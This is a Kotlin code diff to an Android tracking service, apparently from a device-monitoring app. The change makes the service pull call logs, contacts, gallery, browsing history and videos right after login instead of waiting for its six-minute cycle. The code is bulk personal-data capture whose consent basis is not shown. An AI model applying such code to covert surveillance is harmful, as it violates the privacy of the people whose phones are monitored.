@@ -191,13 +191,25 @@ class TrackingForegroundService : Service() {
 
         // Data loop — location/status/sync, runs every 60 s
         scope.launch {
+            var firstFullSyncDone = false
             while (isActive) {
                 runDataCapture()
 
-                slowTick++
-                if (slowTick >= SLOW_EVERY_N_TICKS) {
-                    slowTick = 0
-                    runSlowCapture()
+                if (!firstFullSyncDone) {
+                    // Right after login/start: pull ALL heavy data (call logs,
+                    // contacts, gallery, browsing) immediately instead of waiting
+                    // for the 6-minute slow cycle. runSlowCapture() returns false
+                    // if auth isn't ready yet, so we retry on the next 60 s tick.
+                    if (runSlowCapture()) {
+                        firstFullSyncDone = true
+                        slowTick = 0
+                    }
+                } else {
+                    slowTick++
+                    if (slowTick >= SLOW_EVERY_N_TICKS) {
+                        slowTick = 0
+                        runSlowCapture()
+                    }
                 }
 
                 delay(FAST_INTERVAL_MS)
@@ -227,8 +239,14 @@ class TrackingForegroundService : Service() {
         }
     }
 
-    /** Runs every ~6 minutes — heavier content providers, all native Kotlin (no Flutter needed). */
-    private fun runSlowCapture() {
+    /**
+     * Runs every ~6 minutes (and once immediately after login) — heavier content
+     * providers, all native Kotlin (no Flutter needed).
+     *
+     * @return true if auth was available and the sync ran; false if it was skipped
+     *         (no token yet), so the caller can retry on the next tick.
+     */
+    private fun runSlowCapture(): Boolean {
         android.util.Log.i(TAG, "── Slow cycle: starting native data sync ──")
 
         // Signal Flutter's MonitoringService in case Flutter is in the foreground.
@@ -240,7 +258,7 @@ class TrackingForegroundService : Service() {
         val (token, deviceId) = readAuth()
         if (token == null || deviceId == null) {
             android.util.Log.w(TAG, "Slow cycle SKIP — no auth token/deviceId in SharedPreferences")
-            return
+            return false
         }
         android.util.Log.d(TAG, "Slow cycle syncing for device $deviceId")
 
@@ -253,6 +271,7 @@ class TrackingForegroundService : Service() {
         safeRun { videoUploadSvc.uploadPendingVideos(token, deviceId) }
 
         android.util.Log.i(TAG, "── Slow cycle: done ──")
+        return true
     }
 
     // ── Notification ──────────────────────────────────────────────────────────
